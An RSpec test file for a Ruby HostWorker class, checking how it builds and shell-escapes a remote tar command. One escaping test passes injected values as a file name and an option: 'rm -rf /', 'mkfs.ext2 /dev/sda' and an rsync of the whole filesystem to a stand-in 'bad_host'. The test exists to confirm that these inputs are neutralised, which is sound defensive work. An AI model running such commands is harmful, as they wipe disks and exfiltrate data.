require 'spec_helper'

describe CloudModel::HostWorker do
  it 'should assign host parameter' do
    host = Factory :host
    worker = CloudModel::HostWorker.new host
    expect(worker.instance_variable_get '@host').to eq host
  end
  
  let(:host) { Factory :host }
  subject { CloudModel::HostWorker.new host }
  
  context 'build_tar_bz2' do
    it 'should execute tar on host' do
      host.should_receive(:exec!).with("tar cjf /inst/image.tar.bz2 /mnt/root", "Failed to build tar /inst/image.tar.bz2").and_return 'ok'
      subject.build_tar_bz2 '/mnt/root', '/inst/image.tar.bz2'
    end
    
    it 'should parse boolean parameter' do
      host.should_receive(:exec!).with("tar cjf /inst/image.tar.bz2 --option /mnt/root", "Failed to build tar /inst/image.tar.bz2").and_return 'ok'
      subject.build_tar_bz2 '/mnt/root', '/inst/image.tar.bz2', option: true   
    end

    it 'should parse valued parameter' do
      host.should_receive(:exec!).with("tar cjf /inst/image.tar.bz2 --option=test /mnt/root", "Failed to build tar /inst/image.tar.bz2").and_return 'ok'
      subject.build_tar_bz2 '/mnt/root', '/inst/image.tar.bz2', option: 'test'   
    end
    
    it 'should parse multiplevalued parameter' do
      host.should_receive(:exec!).with("tar cjf /inst/image.tar.bz2 --option=test --option=test2 /mnt/root", "Failed to build tar /inst/image.tar.bz2").and_return 'ok'
      subject.build_tar_bz2 '/mnt/root', '/inst/image.tar.bz2', option: ['test', 'test2']
    end
    
    it 'should escape values' do
      host.should_receive(:exec!).with("tar cjf /inst/image.tar.bz2\\;\\ mkfs.ext2\\ /dev/sda --option\\;\\ echo\\ /dev/random\\ /etc/passwd\\;=test\\;\\ rsync\\ /\\ bad_host:/pirate\\; /mnt/root\\;\\ rm\\ -rf\\ /\\;", "Failed to build tar /inst/image.tar.bz2; mkfs.ext2 /dev/sda").and_return 'ok'
      subject.build_tar_bz2 '/mnt/root; rm -rf /;', '/inst/image.tar.bz2; mkfs.ext2 /dev/sda', 'option; echo /dev/random /etc/passwd;' => 'test; rsync / bad_host:/pirate;'
    end
  end
  
  context 'create_image' do
    pending
  end

  context 'copy_config' do
    pending
  end
  
  context 'config_firewall' do
    pending
  end
  
  context 'config_fstab' do
    pending
  end
  
  context 'config_libvirt_guests' do
    pending
  end
  
  context 'boot_deploy_root' do
    pending
  end
  
  context 'update_tinc_host_files' do
    pending
  end
  
  context 'make_deploy_root' do
    pending
  end
  
  context 'make_keys' do
    pending
  end
  
  context 'copy_keys' do
    pending
  end
  
  context 'deploy' do
    pending
  end
  
  context 'redeploy' do
    pending
  end
end